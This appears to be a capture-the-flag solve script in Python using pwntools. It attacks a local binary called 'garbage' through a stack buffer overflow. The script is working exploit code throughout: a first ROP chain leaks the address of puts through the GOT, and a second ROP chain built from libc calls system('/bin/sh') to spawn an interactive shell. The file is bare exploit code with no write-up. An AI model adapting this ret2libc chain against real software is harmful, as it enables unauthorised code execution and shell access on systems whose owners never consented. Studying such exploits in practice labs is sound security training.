from pwn import * 

context(terminal=["tmux", "new-window"])
p = process('./garbage')
#p = gdb.debug('./garbage', 'b main')

context(os="linux", arch="amd64")
#context.log_level = 'DEBUG'

log.info("Mapping binaries")
garbage = ELF("garbage")
rop = ROP(garbage)
libc = ELF('libc.so.6')

#stage 1 leak
junk = "A"*136
rop.search(regs=['rdi'], order = 'regs')
rop.puts(garbage.got['puts'])
rop.call(garbage.symbols['main'])
log.info("Stage 1 ROP Chain:\n" + rop.dump())

raw_input()

payload = junk + str(rop)

p.sendline(payload)
p.recvuntil("\n")
p.recvuntil("access denied.")
leaked_puts = p.recv()[:8].strip().ljust(8, "\x00")
log.success("Leaked puts@GLIBCL: " + str(leaked_puts))
leaked_puts = u64(leaked_puts)

#stage 2
libc.address = leaked_puts - libc.symbols['puts']
rop2 = ROP(libc)
rop2.system(next(libc.search('/bin/sh\x00')))
log.info("Stage 2 Rop Chain:\n" + rop2.dump())

payload = junk + str(rop2)

p.sendline(payload)
p.recvuntil("\n")
p.recvuntil("access denied.")

#raw_input()
p.interactive()
